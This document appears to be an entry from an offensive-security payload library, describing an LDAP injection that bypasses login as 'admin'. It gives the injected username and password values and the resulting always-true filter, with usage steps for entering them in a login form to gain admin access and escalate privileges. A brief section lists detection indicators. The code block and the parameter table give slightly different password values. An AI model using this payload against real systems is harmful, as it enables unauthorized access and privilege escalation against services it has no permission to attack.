---
id: 1a0c382c-b883-4024-9e25-f5cf52e32082
name: LDAP-Injection-Auth-Bypass-to-Admin
type: code
language: ldap
verified: true
created_at: '2023-04-06T03:56:01.579881+00:00'
updated_at: '2023-10-10T20:36:29.081447+00:00'
platforms:
  - Web
tags:
  - exploitation
  - ldap-injection
  - payload
validated: true
---

# LDAP-Injection-Auth-Bypass-to-Admin

## Code

```ldap
user  = admin)(!(&(1=0
pass  = q))
query = (&(uid=admin)(!(&(1=0)(userPassword=q))))
```

## Description

This LDAP injection payload bypasses authentication by injecting a always-true condition '!( &(1=0) )' into the filter, allowing login as 'admin' without a valid password. It negates a false conjunction to make the entire query evaluate to true.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| user | Injected value for username field | admin)(!(&(1=0 |
| pass | Dummy password field value | q |
| query | Resulting modified LDAP filter | (&(uid=admin)(!(&(1=0)(userPassword=q)))) |

## Usage

Inject the 'user' value into the login form's username field. Used in Step 3 of [[procedures/LDAP-Injection-Exploitation]] to gain admin access for privilege escalation.

## Detection

- Audit logs showing queries with logical operators like '!( &(1=0' or tautologies.
- Successful logins with invalid passwords or unusual user patterns.
- Application logs indicating filter modifications.

## Related

- [[procedures/LDAP-Injection-Exploitation]]
